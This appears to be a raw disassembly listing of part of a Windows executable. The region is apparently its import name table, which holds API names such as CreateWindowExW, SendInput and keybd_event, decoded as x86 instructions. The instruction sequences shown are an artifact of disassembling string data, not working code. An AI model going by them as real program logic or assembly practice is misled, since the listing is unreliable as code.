  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
